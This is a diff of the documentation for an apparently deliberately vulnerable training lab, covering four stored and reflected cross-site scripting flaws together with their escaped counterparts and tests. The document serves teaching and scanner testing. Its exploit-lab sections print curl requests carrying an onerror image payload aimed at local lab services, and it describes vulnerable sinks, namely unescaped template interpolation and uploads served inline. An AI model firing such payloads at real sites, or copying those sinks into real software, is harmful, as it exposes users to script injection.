@@ -1,26 +1,13 @@
 # `XSS` — cross-site scripting
 
-3 scenarios: `XSS-001` in `notifications`, `XSS-002` in `accounts`, `XSS-004` in `accounts`.
+Four weaknesses, each a caller's string written into an answer as markup or as a page. An announcement's body is written into an HTML page as it was stored (`notifications`, `XSS-001`). A stored upload is served inline as the type its uploader declared, and a stored display name is concatenated into the old console's page (`accounts`, `XSS-002` and `XSS-004`). The public status page of the `gateway` greets the caller with their own markup, from a scope that sets no security headers (`XSS-003`). The protected counterparts are in `apps/notifications/src/announcements/announcement-by-id.controller.ts`, `apps/notifications/src/announcements/announcement-page.controller.ts`, `apps/accounts/src/documents/documents.controller.ts`, `apps/accounts/src/admin/admin.controller.ts` and `apps/gateway/src/status/status.controller.ts`.
 
-**In `accounts`.**
+The `accounts` reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). `XSS-001` was reproduced on 2026-11-27 against the service alone on `127.0.0.1:3103`, and `XSS-003` the same day against the gateway alone on `127.0.0.1:4400`, with stand-ins for the three subgraphs. Each counterpart's claim is scoped: this operation, receiving the identical input, keeps the string out of the reader's DOM for the reason given. Nothing here says any page is secure in general.
 
-Two weaknesses of the old console in `accounts`: a served file and a rendered page. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).
-
-**In `notifications`.**
-
-**Family:** `XSS` · **Service:** `notifications` · **Scanner:** SAST · **OWASP:** A03
-
-An announcement's body is text a caller chose, and one of the three ways of
-reading an announcement writes it into an HTML page as it was stored. The
-other two do not: one answers JSON with `nosniff`, the other renders a fixed
-template with the body escaped behind a content security policy.
-
-| ID | The operation | The sink | CWE |
-| --- | --- | --- | --- |
-| XSS-001 | `GET /internal/announcements/:id/html` | `<%- body %>` in `views/announcement-html.ejs`, served as `text/html` | CWE-79 |
-
+<a id="xss-001"></a>
 ## XSS-001 — an announcement page that serves script
 
+<a id="xss-001-agent"></a>
 ### XSS-001 — agent reference
 
 - **Scenario:** XSS-001, script in an announcement page.
@@ -32,6 +19,7 @@ template with the body escaped behind a content security policy.
 - **Tests:** `apps/notifications/test/scenarios/xss.int-spec.ts`.
 - **Expected finding:** yes. A SAST tool must report stored caller text written into an HTML response unescaped.
 
+<a id="xss-001-student"></a>
 ### XSS-001 — student guide
 
 The line (`apps/notifications/src/announcements/announcement-html.controller.ts`):
@@ -58,6 +46,7 @@ a lab." Stored XSS does not care who stored it: the field is caller input
 the moment any caller can reach a route that writes it, and the page is
 public.
 
+<a id="xss-001-exploit"></a>
 ### XSS-001 — exploit lab
 
 Run on 2026-11-27 against the service alone on `127.0.0.1:3103`. The
@@ -79,6 +68,7 @@ page that serves script`, which creates its own announcement and reads the
 page. In Burp: broadcast the payload announcement, then send the GET from
 Repeater and read the page.
 
+<a id="xss-001-safe"></a>
 ### XSS-001 — vulnerable and protected
 
 | | Operation | What it does with the same body |
@@ -93,6 +83,7 @@ and escaped text on the third, where the policy would refuse a script even
 if one slipped through. The claim is not that the policy makes every page
 safe; only that this stored script reaches no reader's DOM through them.
 
+<a id="xss-001-tests"></a>
 ### XSS-001 — tests
 
 `apps/notifications/test/scenarios/xss.int-spec.ts`, describe `XSS-001: an
@@ -107,8 +98,12 @@ body is the `onerror` image — is stored once per test by
 - **Counterpart 2:** `text/html`, a policy containing `script-src 'none'`,
   and the page holds `&lt;img`, never `<img`.
 
+The collection `postman/notifications/vuln-nestjs.notifications.postman_collection.json` carries two requests: `XSS-001: an announcement page that serves script` and `XSS-001: the page the script lives in`.
+
+<a id="xss-002"></a>
 ## XSS-002 — the stored upload served inline as its stored type
 
+<a id="xss-002-agent"></a>
 ### XSS-002 — agent reference
 
 | | |
@@ -120,10 +115,12 @@ body is the `onerror` image — is stored once per test by
 | Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
 | Expected finding | Yes, CWE-79, SAST |
 
+<a id="xss-002-student"></a>
 ### XSS-002 — student guide
 
 Content type is the server's claim about bytes. When the claim is the uploader's own word and the bytes go inline, an upload becomes a page of the origin it was uploaded to.
 
+<a id="xss-002-exploit"></a>
 ### XSS-002 — exploit lab
 
 ```console
@@ -146,6 +143,7 @@ $ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/documents/<id>/image 
 415
 ```
 
+<a id="xss-002-safe"></a>
 ### XSS-002 — vulnerable and protected
 
 | | Why |
@@ -154,12 +152,113 @@ $ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/documents/<id>/image 
 | `:id/view` (protected) | An attachment with `nosniff`: downloaded, not rendered |
 | `:id/image` (protected) | Images only — an HTML document is a 415 |
 
+**Scoped claim.** Each counterpart defeats this flaw for identical input: the same stored HTML upload that is served inline as `text/html` by the name route is served by id as an attachment with `nosniff`, which a browser downloads and does not render, and is refused by the image route, 415, which serves images only. The claim is not that an attachment or an image route is harmless in every browser; only that this document runs as no page through them.
+
+<a id="xss-002-tests"></a>
 ### XSS-002 — tests
 
 `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `XSS-002`: the view route answers `text/html` inline with the marker; by id the same document is an attachment with `nosniff`, and the image route refuses it.
 
+The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries the request `XSS-002: the stored upload served inline as text/html`.
+
+<a id="xss-003"></a>
+## XSS-003 — the public status page greets the caller with their own markup
+
+<a id="xss-003-agent"></a>
+### XSS-003 — agent reference
+
+- **Source:** `apps/gateway/src/public-api/public-status.controller.ts` — `${name}` written into the greeting of the HTML answer.
+- **Operation:** `GET /api/v1/public/status?name=…`, REST, public.
+- **Sink:** the `text/html` answer of the public scope, which carries no content security policy, no `nosniff`, no frame options.
+- **Flow:** `?name=<img onerror> → the greeting line → the caller's markup is the page's markup`.
+- **Counterparts:** `apps/gateway/src/status/status.controller.ts` — `GET /api/v1/status` (the same name escaped into a fixed template, a policy set by hand), `GET /api/v1/status.json` (the name as a JSON value, `nosniff`).
+- **Tests:** `apps/gateway/test/scenarios/edge.int-spec.ts` (the gateway alone, against stand-ins) and `tests/e2e/scenarios-edge.e2e-spec.ts` (the whole lab).
+- **Expected finding:** CWE-79 on the public status controller. A report on the two counterpart routes for this CWE is a false positive.
+
+<a id="xss-003-student"></a>
+### XSS-003 — student guide
+
+A greeting that answers the caller by name is one interpolation; when the
+name is written into the page as it arrived, the page is whoever asks for it.
+Here the whole answer is built with a template literal whose only variable
+part is the caller's `name`, so a `name` of `<img src=x
+onerror="window.__zazzles='zazzles-lab-marker'">` is served as the page's own
+markup — and the page is served from the public scope, where the edge's
+security headers are off: no content security policy would refuse the script
+even if the browser believed the tag. Any browser that opens the link runs
+the `onerror` the moment the page renders.
+
+<a id="xss-003-exploit"></a>
+### XSS-003 — exploit lab
+
+The `name` is the marker, URL-encoded by the caller's client as
+`%3Cimg%20src%3Dx%20onerror%3D%22window.__zazzles%3D'zazzles-lab-marker'%22%3E`.
+
+```console
+$ curl -s -i "http://127.0.0.1:4400/api/v1/public/status?name=%3Cimg%20src%3Dx%20onerror%3D%22window.__zazzles%3D'zazzles-lab-marker'%22%3E"
+HTTP/1.1 200 OK
+Origin-Agent-Cluster: ?1
+content-type: text/html; charset=utf-8
+…
+    <p>Hello, <img src=x onerror="window.__zazzles='zazzles-lab-marker'">.</p>
+```
+
+`200`, `text/html`, and the marker sits in the page unescaped with no policy
+above it: opened in a browser, `window.__zazzles` becomes
+`'zazzles-lab-marker'`. The same `name` through the counterparts:
+
+```console
+$ curl -s "http://127.0.0.1:4400/api/v1/status?name=%3Cimg%20src%3Dx%20onerror%3D%22window.__zazzles%3D'zazzles-lab-marker'%22%3E"
+<!DOCTYPE html>
+…
+    <p>Hello, &lt;img src=x onerror=&quot;window.__zazzles=&#39;zazzles-lab-marker&#39;&quot;&gt;.</p>
+…
+
+$ curl -s -i "http://127.0.0.1:4400/api/v1/status.json?name=%3Cimg%20src%3Dx%20onerror%3D%22window.__zazzles%3D'zazzles-lab-marker'%22%3E"
+HTTP/1.1 200 OK
+…
+X-Content-Type-Options: nosniff
+…
+content-type: application/json; charset=utf-8
+…
+{"status":"ok","service":"gateway","caller":"<img src=x onerror=\"window.__zazzles='zazzles-lab-marker'\">","backendServices":["accounts","trading","notifications"]}
+```
+
+In Postman: `GET {{gatewayUrl}}/api/v1/public/status?name=<the encoded
+marker>` and read the raw `<img` in the body. In Burp: the same GET from
+Repeater, or paste the decoded URL into a browser driven by the intercepting
+proxy.
+
+<a id="xss-003-safe"></a>
+### XSS-003 — vulnerable and protected
+
+| | What it does with the same `name` | Why that holds |
+| --- | --- | --- |
+| `public/status` (vulnerable) | Writes it into the greeting unescaped, as `text/html`, no policy | The template interpolates the caller's markup into the page |
+| `status` (protected) | Escapes it — `<` becomes `&lt;`, quotes become entities — behind `content-security-policy: default-src 'self'` and `x-frame-options: DENY` | The name is data in a fixed template, and the policy would refuse a script even if one slipped through |
+| `status.json` (protected) | Answers it as a JSON value with `nosniff` | JSON is not a document to run markup in, and `nosniff` keeps a browser from reading it as one |
+
+**Scoped claim.** Each counterpart defeats this flaw for identical input: the
+`name` that is markup on the first route is escaped text on the second and a
+JSON value on the third. The claim is not that escaping or `nosniff` makes
+every page safe; only that this marker reaches no DOM through them.
+
+<a id="xss-003-tests"></a>
+### XSS-003 — tests
+
+`apps/gateway/test/scenarios/edge.int-spec.ts`: one test sends the encoded
+marker to the public page and asserts the answer is `text/html` carrying the
+marker unescaped (`&lt;img` nowhere) — what was gained; two tests send the
+same marker to the counterparts and assert the escape (`&lt;img src=x` and
+`default-src 'self'`) and the JSON shape (`nosniff`, the marker a value) —
+why each was refused.
+
+`tests/e2e/scenarios-edge.e2e-spec.ts` makes the same proofs against the whole lab. The collection `postman/gateway/vuln-nestjs.gateway.postman_collection.json` carries three requests: `XSS-003 the public status page serves the caller's markup unescaped`, `XSS-003 the default status page escapes the same name` and `XSS-003 status.json answers the name as a JSON value with nosniff`.
+
+<a id="xss-004"></a>
 ## XSS-004 — a stored display name rendered unescaped
 
+<a id="xss-004-agent"></a>
 ### XSS-004 — agent reference
 
 | | |
@@ -171,10 +270,12 @@ $ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/documents/<id>/image 
 | Tests | `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts` |
 | Expected finding | Yes, CWE-79, SAST |
 
+<a id="xss-004-student"></a>
 ### XSS-004 — student guide
 
 Stored XSS needs two things: a value that carries markup, and a page that renders it as markup. The old console's page built its rows by concatenation, so the value was the page.
 
+<a id="xss-004-exploit"></a>
 ### XSS-004 — exploit lab
 
 ```console
@@ -196,6 +297,7 @@ $ curl -s $RELAY/internal/admin/directory -H "authorization: Bearer $ADMIN" | gr
 
 And the directory page's CSP allows nothing: `default-src 'none'; style-src 'none'; script-src 'none'`.
 
+<a id="xss-004-safe"></a>
 ### XSS-004 — vulnerable and protected
 
 | | Why |
@@ -204,6 +306,11 @@ And the directory page's CSP allows nothing: `default-src 'none'; style-src 'non
 | `GET /internal/admin/users` (protected) | The names are data in JSON, and `nosniff` says the browser may not read the answer as a page |
 | `GET /internal/admin/directory` (protected) | A fixed template escapes every value, and the page's CSP allows no script |
 
+**Scoped claim.** Each counterpart defeats this flaw for identical input: the same stored display name that renders as script in the users-html page is a value in JSON with `nosniff` on the users route, and is escaped by the fixed template of the directory page, whose policy allows no script. The claim is not that escaping or a policy makes every page safe; only that this name reaches no DOM as markup through them.
+
+<a id="xss-004-tests"></a>
 ### XSS-004 — tests
 
 `apps/accounts/test/scenarios/fs-xss-ssrf.int-spec.ts`, `XSS-004`: the stored script renders raw on the page; the JSON route carries it as data with `nosniff`; the directory escapes it and its CSP allows nothing (the lab reset restores the name afterwards).
+
+The collection `postman/accounts/vuln-nestjs.accounts.postman_collection.json` carries four requests: `XSS-004: a stored display name rendered unescaped`, `XSS-004: the console page renders it`, `XSS-004: the directory page escapes it` and `XSS-004: the store back as it was`.
